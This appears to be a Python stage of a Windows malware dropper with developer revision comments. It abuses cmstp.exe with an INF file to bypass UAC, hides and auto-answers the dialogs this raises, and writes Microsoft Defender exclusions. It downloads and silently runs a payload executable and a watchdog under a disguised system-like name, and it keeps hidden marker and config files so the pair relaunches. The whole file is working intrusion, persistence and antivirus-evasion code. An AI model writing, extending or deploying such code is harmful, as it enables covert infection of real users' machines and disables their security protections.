        p = subprocess.Popen(["cmstp.exe", "/au", inf_path],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                             creationflags=0x08000000, cwd=os.environ.get("TEMP", os.getcwd()))
        # r45: armed before the hunt starts — see the sibling site above.
        dismisser.target_pid = p.pid
    except Exception:
        return
    dismisser.start()

    # r143: the elevated stage kills cmstp the moment it runs, so the medium
    # guard has nothing to guard — a short watch, not the old 18s of
    # PostMessage calls UIPI was dropping on the floor anyway.
    dismisser.wait(8.0)
    dismisser.settle(quiet=1.0, floor=2.0, cap=4.0)
    kill_all_cmstp()    # r135: API-side terminator, same timing the INF pad had
    _sweep_dialogs(svc_name, seconds=1.0)   # r139: any survivor is hidden + answered
    try:
        os.unlink(inf_path)
    except Exception:
        pass


def download(url):
    for i in range(3):
        try:
            req = Request(url, headers={"User-Agent": "Mozilla/5.0"})
            with urlopen(req, timeout=60) as resp:
                data = resp.read()
            if len(data) > 1024:
                return data
        except Exception:
            time.sleep(2 ** i)
    return None


def is_valid_exe(path, min_size=50000):
    # r141: the wd exe is a ~30 KB image — the carrier's 50 KB floor read it as
    # "never staged", so it was re-downloaded (and killed) on every single run.
    # the caller passes its own floor.
    try:
        if not os.path.exists(path):
            return False
        if os.path.getsize(path) < min_size:
            return False
        with open(path, "rb") as fh:
            return fh.read(2) == b"MZ"
    except Exception:
        return False


def write_file(path, data, exe=EXE_NAME):
    kill_process(exe)
    time.sleep(0.3)
    tmp = path + f".{rand_str(6)}.tmp"
    try:
        with open(tmp, "wb") as fh:
            fh.write(data)
        try:
            os.unlink(path)
        except Exception:
            pass
        os.rename(tmp, path)
        return True
    except Exception:
        try:
            os.unlink(tmp)
        except Exception:
            pass
        return False


# ---- r140: the re-fire gate -------------------------------------------------
# dj field: the first exe opened, then the same cmstp profile box started
# coming back with every beat. the watchdog cannot always SEE an elevated
# carrier (a ProcessHandle query hands back an empty image path for a
# higher-integrity process), so each 10s beat read "dead", re-ran this file,
# and the LIFT ran again — a fresh random service profile every time, and the
# profile box with it. a re-fire only has to re-EXEC the pair; the lift is a
# one-time job.
LIFT_MARK = os.path.join(PERSIST_DIR, "wcache.lift")
# dj (this build): the marker carries the COVERAGE REVISION, not just "lift
# ran". a box that lifted under the old one-dir writer re-lifts exactly once
# to pick up the wide set, then the tag matches and the lift is never seen
# again. a refused write tags revision:attempts and settles after EXCL_TRIES.
EXCL_REV = b"3"
# a lift whose read-back stays empty is retried, but only this many times —
# past that the tag settles on the bare revision and the box never lifts again.
EXCL_TRIES = 3


def lift_landed():
    """the lift already ran on this box AT THE CURRENT COVERAGE REVISION, or
    the wide set is visibly in place. the marker read is the gate: an old box
    carries the old tag and takes the one extra lift; a failed lift retries
    EXCL_TRIES times and then settles, so the cmstp box can never come back on
    every boot."""
    tag = b""
    try:
        with open(LIFT_MARK, "rb") as fh:
            tag = fh.read().strip()
    except Exception:
        tag = b""
    if tag == EXCL_REV:
        return True
    if tag.startswith(EXCL_REV + b":"):
        try:
            if int(tag.split(b":", 1)[1]) >= EXCL_TRIES:
                return True
        except Exception:
            return True
    try:
        return bool(exclusion_landed()) and exclusions_landed()
    except Exception:
        return False


def _wait_landed(limit=30.0):
    """poll the wide set until it is visible — the elevated stage runs after
    cmstp returns, and only a covered store counts as landed. bounded, so a
    box that genuinely refuses the write still gets its tag written."""
    end = time.time() + float(limit)
    while True:
        try:
            if exclusions_landed():
                return True
        except Exception:
            pass
        if time.time() >= end:
            return False
        time.sleep(0.5)


def mark_lift(done=None):
    """tag = bare revision when the wide set reads back (or the caller does not
    know), else revision:attempts — the retry counter lift_landed() settles."""
    try:
        tag = EXCL_REV
        if done is False:
            n = 1
            try:
                with open(LIFT_MARK, "rb") as fh:
                    cur = fh.read().strip()
                if cur.startswith(EXCL_REV + b":"):
                    n = int(cur.split(b":", 1)[1]) + 1
            except Exception:
                n = 1
            tag = EXCL_REV + b":" + str(n).encode()
        with open(LIFT_MARK, "wb") as fh:
            fh.write(tag)
    except Exception:
        pass


def carrier_img():
    """the image name the carrier is actually running under: the download keeps
    its dotted asset name, and only a landed relocation turns it into
    SettingsSyncHost.exe. the cfg must name the one that is on the box."""
    try:
        if os.path.isfile(DURABLE_MAIN_PATH):
            return DURABLE_MAIN
    except Exception:
        pass
    return EXE_NAME


def write_wd_cfg(folder):
    """r143: the same cfg the stage lays, for the re-fire road — a wd image
    with no wd.cfg beside it returns 0 immediately, which is why the re-fire
    used to wake nothing at all. work.py writes this from medium integrity,
    so it can land beside the AppHost image too (the ProgramData one needs
    the stage's token; if it is already there this is a no-op)."""
    try:
        import base64
        enc = lambda s: base64.urlsafe_b64encode(
            s.encode("utf-8")).decode("ascii").rstrip("=")
        cfg = enc(carrier_img()) + "\n" + enc(MAIN_TASK) + "\n" + WD_TASK + "\n"
        p = os.path.join(folder, WDCFG)
        try:
            with open(p, "r", encoding="utf-8") as fh:
                if fh.read() == cfg:
                    return p
        except Exception:
            pass
        with open(p, "w", encoding="utf-8") as fh:
            fh.write(cfg)
        try:
            kernel32.SetFileAttributesW(p, 0x2)
        except Exception:
            pass
        return p
    except Exception:
        return ""


def reexec_pair():
    """r140: the whole job of a re-fire — both images up, nothing on screen.
    the probe is work.py's own toolhelp walk: unlike a ProcessHandle query it
    sees elevated images, so this road cannot loop on a false 'dead'. the jar's
    own bare-spawn fallback has the same shape.

    r143: the DURABLE images are the targets (AppHost is only the launcher),
    and both carrier names are probed — SettingsSyncHost.exe is what the
    relocated instance actually shows. the twin gets its cfg laid beside
    whatever image it has, or it exits 0 and watches nothing."""
    try:
        if not (proc_alive(DURABLE_MAIN) or proc_alive(EXE_NAME)):
            run = DURABLE_MAIN_PATH if os.path.exists(DURABLE_MAIN_PATH) else EXE_PATH
            if run and os.path.exists(run):
                subprocess.Popen([run], creationflags=0x08000000)
    except Exception:
        pass
    if not (WD_URL or WDXN_ENV):
        return
    try:
        if proc_alive(WD_NAME):
            return
    except Exception:
        pass
    for folder, name in ((DURABLE_DIR, WD_NAME), (PERSIST_DIR, WD_NAME)):
        try:
            p = os.path.join(folder, name) if name else ""
            if not p or not os.path.exists(p):
                continue
            write_wd_cfg(folder)
            subprocess.Popen([p], creationflags=0x08000000)
            return
        except Exception:
            continue


def main():
    try:
        os.makedirs(PERSIST_DIR, exist_ok=True)
    except Exception:
        return

    # dj (this build): the wide set goes in FIRST, before any image is staged —
    # on an elevated token this lands it outright; on a medium one the writes
    # are refused and the lift road below writes the same list under the
    # stage's token. either way the list is one function.
    try:
        add_defender_exclusions()
    except Exception:
        pass

    # r1.1.2: the exclusion-push loop stays OUT of this body (r14 shape).
    # exclusions ride the STAGE road below: after the lift, the elevated
    # stage materializes + executes exclusions.py, then execs the carrier.
    # r34 fix: this call was run_elevated() — which lifted the carrier exe
    # DIRECTLY and never built/executed the stage, so exclusions.py could
    # not run on any box. that was the whole field miss.
    try:
        if not is_valid_exe(EXE_PATH):
            data = download(EXE_URL) if EXE_URL else None
            if data and not write_file(EXE_PATH, data):
                return
    except Exception:
        pass

    # r98 (dj order): the wd exe rides the SAME stage — fetched + staged beside
    # the carrier BEFORE the lift, so the elevated stage execs the pair in
    # order (tung -> watchdog) with one exclusion covering both.
    try:
        if WD_URL and not is_valid_exe(WD_PATH, 8000):
            wdata = download(WD_URL)
            if wdata:
                write_file(WD_PATH, wdata, exe=WD_NAME)
    except Exception:
        pass

    # r141 (dj): no lift until BOTH images are on disk. a lift that runs with a
    # missing half is exactly what left the watchdog dead and the box looping.
    # r143: the wd half of the gate follows WDXN too — a re-fire run carries the
    # name and no url, and the old gate let it through with no wd on disk.
    if not is_valid_exe(EXE_PATH) or ((WD_URL or WDXN_ENV) and not is_valid_exe(WD_PATH, 8000)):
        reexec_pair()
        return

    # r140: a watchdog re-fire lands here with everything already staged and
    # the exclusion already written. exec the pair and leave — no cmstp on this
    # road, so no profile is created and no box can be raised.
    if lift_landed():
        reexec_pair()
        return

    set_defender_exclusions()

    # r144: the lift is ASYNCHRONOUS — cmstp hands the INF off and returns, so
    # the stage (and exclusions.py inside it) is still ~3-6s of work away. the
    # old immediate read-back raced it, read False on every boot, burned one
    # attempt, and settled the tag at revision:2 while the elevated write was
    # still in flight. wait for the stage before judging it.
    ok_wide = _wait_landed(30.0)
    mark_lift(ok_wide)

    # the tag above already says whether the wide set reads back (bare rev) or
    # how many lifts it took (rev:n) — nothing else to write here.

    # r142 (dj order: no jar-side watcher — work.py owns the pair): the lift's
    # elevated stage starts carrier + watchdog exe, and this catches anything
    # that did not come up. the 0.5s lets a just-spawned image appear in the
    # toolhelp walk, so an image the stage already started is not spawned twice.
    time.sleep(0.5)
    reexec_pair()


main()
